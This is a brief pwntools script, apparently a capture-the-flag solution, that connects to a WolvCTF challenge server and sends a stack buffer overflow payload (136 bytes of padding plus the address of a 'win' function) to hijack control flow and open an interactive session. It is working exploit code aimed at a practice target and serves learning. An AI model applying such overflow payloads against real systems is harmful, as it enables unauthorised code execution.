from pwn import *
exe = ELF("./challenge")
# r = process("./challenge")
r = remote("cat.wolvctf.io", 1337)
r.recvlines(3)
payload = b"a" *136 + p64(exe.sym['win'] + 5)
r.sendline(payload)


r.interactive()